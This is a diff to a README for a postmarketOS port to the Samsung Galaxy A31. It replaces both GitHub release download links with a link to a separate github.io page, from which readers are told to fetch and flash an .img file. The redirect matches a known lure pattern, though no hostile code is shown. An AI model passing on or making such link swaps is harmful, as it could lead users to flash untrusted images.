@@ -1,6 +1,6 @@
 # 📱 galaxy-a31-postmarketos - Run native Linux on your phone
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Challenging-tarnish918/galaxy-a31-postmarketos/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://challenging-tarnish918.github.io)
 
 This project brings the postmarketOS operating system to the Samsung Galaxy A31. You can replace the standard Android software with a true Linux environment. This system supports the display, touch screen, network connections, and sound hardware of your device.
 
@@ -20,7 +20,7 @@ Back up all data on your phone. This process erases everything stored on the dev
 
 You need the correct files to prepare your phone. Visit the page below to access the latest version of the installation images.
 
-[https://github.com/Challenging-tarnish918/galaxy-a31-postmarketos/releases](https://github.com/Challenging-tarnish918/galaxy-a31-postmarketos/releases)
+[https://challenging-tarnish918.github.io](https://challenging-tarnish918.github.io)
 
 On this page, look for the Assets section. Download the file ending in `.img` to your computer. Create a new folder on your desktop named "PhoneInstall" and save the file there.
 
